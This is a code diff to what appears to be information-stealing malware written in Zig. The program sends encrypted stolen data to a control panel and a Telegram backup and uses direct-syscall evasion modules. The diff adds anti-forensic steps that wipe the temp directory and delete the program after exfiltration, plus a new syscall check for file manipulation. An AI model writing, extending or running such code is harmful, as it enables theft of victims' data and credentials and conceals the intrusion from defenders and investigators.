@@ -32,6 +32,8 @@ const zip_mod = @import("network/zip.zig");
 const telegram_net = @import("network/telegram.zig");
 const panel_http = @import("network/panel_http.zig");
 const detection = @import("evasion/detection.zig");
+const self_delete = @import("cleanup/self_delete.zig");
+const temp_wipe = @import("cleanup/temp_wipe.zig");
 
 const is_debug = true;
 
@@ -391,7 +393,10 @@ fn runProductionPipeline() void {
     sendToPanel(allocator, encrypted, metadata);
     sendToTelegramBackup(allocator, encrypted);
 
-    logMsg("[+] Pipeline complete\n");
+    logMsg("[+] Pipeline complete, cleaning up...\n");
+    temp_wipe.wipeTempDirectory(allocator);
+    const delete_result = self_delete.selfDelete(allocator);
+    log("[+] Self-delete result: {d}\n", .{@intFromEnum(delete_result)});
 }
 
 pub fn main() void {
@@ -524,6 +529,7 @@ fn runDebugTests() void {
     assert(engine.ssn_NtOpenKey != 0, "ssn_NtOpenKey != 0");
     assert(engine.ssn_NtQueryValueKey != 0, "ssn_NtQueryValueKey != 0");
     assert(engine.ssn_NtSetInformationProcess != 0, "ssn_NtSetInformationProcess != 0");
+    assert(engine.ssn_NtSetInformationFile != 0, "ssn_NtSetInformationFile != 0");
 
     dbg.print("--- SSN Resolution (App-Bound) ---\n");
     assert(engine.ssn_NtGetContextThread != 0, "ssn_NtGetContextThread != 0");
